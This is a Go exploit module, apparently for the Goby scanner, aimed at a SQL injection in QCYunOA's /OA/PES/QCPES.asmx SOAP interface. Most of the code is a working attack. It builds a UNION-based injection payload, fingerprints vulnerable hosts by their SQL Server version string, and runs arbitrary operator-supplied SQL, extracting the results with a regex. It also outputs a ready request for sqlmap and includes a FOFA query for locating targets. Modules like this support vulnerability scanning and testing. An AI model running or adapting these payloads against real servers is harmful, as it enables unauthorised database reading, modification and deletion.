package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "QCYun /OA/PES/QCPES.asmx SQL Injection Vulnerability",
    "Description": "<p>The /OA/PES/QCPES.asmx interface in QCYunOA system has a SQL injection vulnerability. Attackers can exploit this vulnerability to perform malicious operations on the database, thereby obtaining, modifying, or deleting sensitive information in the database.</p>",
    "Product": "QCYunOA",
    "Homepage": "https://www.eqccd.com/",
    "DisclosureDate": "2024-09-19",
    "PostTime": "2024-11-07",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"images/yipeoplehover.png\" && body=\"images/yiphone.png\"",
    "GobyQuery": "body=\"images/yipeoplehover.png\" && body=\"images/yiphone.png\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the SQL injection vulnerability to obtain, modify, or delete sensitive information in the database, potentially leading to data leakage or destruction.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://www.eqccd.com/\">https://www.eqccd.com/</a></p><p>2.It is recommended to strictly filter and validate input parameters and use parameterized queries to prevent SQL injection attacks.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142366186",
        ""
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@version,db_name(),user",
            "show": "attackType=default"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "全程云 /OA/PES/QCPES.asmx SQL 注入漏洞",
            "Product": "全程云OA",
            "Description": "<p>全程云OA系统中的/OA/PES/QCPES.asmx接口存在SQL注入漏洞，攻击者可以通过该漏洞对数据库进行恶意操作，从而获取、修改或删除数据库中的敏感信息。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;<br></p><p><a href=\"https://www.eqccd.com/\">https://www.eqccd.com/</a><br></p><p>2、建议对输入参数进行严格的过滤和验证，使用参数化查询以防止SQL注入攻击。</p>",
            "Impact": "<p>攻击者可以通过SQL注入漏洞获取、修改或删除数据库中的敏感信息，可能导致数据泄露或破坏。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "QCYun /OA/PES/QCPES.asmx SQL Injection Vulnerability",
            "Product": "QCYunOA",
            "Description": "<p>The /OA/PES/QCPES.asmx interface in QCYunOA system has a SQL injection vulnerability. Attackers can exploit this vulnerability to perform malicious operations on the database, thereby obtaining, modifying, or deleting sensitive information in the database.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"https://www.eqccd.com/\">https://www.eqccd.com/</a><br></p><p>2.It is recommended to strictly filter and validate input parameters and use parameterized queries to prevent SQL injection attacks.</p>",
            "Impact": "<p>Attackers can exploit the SQL injection vulnerability to obtain, modify, or delete sensitive information in the database, potentially leading to data leakage or destruction.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

sendPayloadsajfjka := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
	//POST请求
	setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
		postRequest := httpclient.NewPostRequestConfig(url)
		postRequest.Timeout = 15
		postRequest.VerifyTls = false
		postRequest.FollowRedirect = false
		postRequest.Data = payload
		for headName, headValue := range head {
			postRequest.Header.Store(headName, headValue)
		}
		return httpclient.DoHttpRequest(hostInfo, postRequest)
	}

	//按需求选择自己的发包方式

	//---------------------------------------------
	//以下是发包具体内容,这里以POST请求为例
	//---------------------------------------------
	//漏洞的url
	url := `/OA/PES/QCPES.asmx`
	//拼接sql语句
	body := `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCode xmlns="http://tempuri.org/">
      <fk_parid>1' UNION ALL SELECT ` + sql + `-- oCWH</fk_parid>
      <value>1</value>
    </GetCode>
  </soap:Body>
</soap:Envelope>`
	header := map[string]string{
		"Content-Type": "text/xml; charset=utf-8",
		"SOAPAction":    `"http://tempuri.org/GetCode"`,
	}
	resp, err := setPostRequest(hostInfo, url, body, header)
	if err != nil {
		return nil, err
	}
	//状态码可自定义,这里默认200
	if resp.StatusCode != 200 {
		return nil, errors.New("not response 200")
	}
	return resp, nil
}
	
	ExpManager.AddExploit(NewExploit(
	  goutils.GetFileName(),
	  expJson,
	  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		sendPayload := sendPayloadsajfjka
		// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
		// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
		// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
		// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
		// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
	
		//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配
	
		//如果是其他类型的注入,请按照具体情况进行检测
		sql := `@@VERSION`
		resp, err := sendPayload(hostInfo, sql)
		if err != nil {
		  return false
		}
		if !strings.Contains(resp.Utf8Html, `Microsoft SQL Server`) {
		  return false
		}
	   if !strings.Contains(resp.Utf8Html, `<GetCodeResult>`) {
		  return false
		}
		// 拼接SQL注入数据包的请求路径即可
		ss.VulURL = hostInfo.FixedHostInfo + `/OA/PES/QCPES.asmx`
		return true
	  },
	  func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		sendPayload := sendPayloadsajfjka
		attackType := goutils.B2S(stepLogs.Params["attackType"])
		
		//Switch ExpParams
		//若自己修改ExpParams,请自行修改switch case
		switch attackType {
		case "default":
		  sql := goutils.B2S(stepLogs.Params["default"])
		  resp, err := sendPayload(expResult.HostInfo, sql)
		  if err != nil && strings.Contains(err.Error(), "not response 200") {
			expResult.Output = `漏洞利用失败:` + err.Error()
			expResult.Success = false
			return expResult
		  }
	
		  // 正则匹配利用结果,需自己修改
		  // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
		  re := regexp.MustCompile(`<GetCodeResult>([^<]+)<`)
		  match := re.FindStringSubmatch(resp.Utf8Html)
		  if len(match) < 1 {
			//正则失败
			expResult.Output = `Exploitation failed.`
			expResult.Success = false
			return expResult
		  }
		  expResult.Success = true
	
		  expResult.Output = `The key points you need to extract is : ` + match[1]
	  fmt.Print(expResult)
		  return expResult
		case "sql":
		  sql := goutils.B2S(stepLogs.Params["sql"])
		  resp, err := sendPayload(expResult.HostInfo, sql)
		  if err != nil && strings.Contains(err.Error(), "not response 200") {
			expResult.Output = `漏洞利用失败:` + err.Error()
			expResult.Success = false
			return expResult
		  }
	
		  // 正则匹配利用结果,需自己修改
		  // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
		  re := regexp.MustCompile(`<GetCodeResult>([^<]+)<`)
		  match := re.FindStringSubmatch(resp.Utf8Html)
		  if len(match) < 1 {
			//正则失败
			expResult.Output = `Exploitation failed.`
			expResult.Success = false
			return expResult
		  }
		  expResult.Success = true
	
		  expResult.Output = `The key points you need to extract is : ` + match[1]
	  fmt.Print(expResult)
		  return expResult
	
		case "sqlPoint":
		  sql := "@@VERSION"
		  _, err := sendPayload(expResult.HostInfo, sql)
		  if err != nil {
			expResult.Output = `Exploitation failed: ` + err.Error()
			expResult.Success = false
			return expResult
		  }
		  //sqlPoint,给用户跑sqlmap用,需修改对应的参数
		  expResult.Success = true
		  expResult.Output = `POST /OA/PES/QCPES.asmx HTTP/1.1
	Host: ` + expResult.HostInfo.HostInfo + `
	Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetCode"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCode xmlns="http://tempuri.org/">
      <fk_parid>1' UNION ALL SELECT @@VERSION-- oCWH</fk_parid>
      <value>1</value>
    </GetCode>
  </soap:Body>
</soap:Envelope>
	`
		  return expResult
		//检查ExpParams是否设置正确
		default:
		  expResult.Output = `Unknown attack type: ` + attackType
		  expResult.Success = false
		  return expResult
		}
	  },
	))
	
	}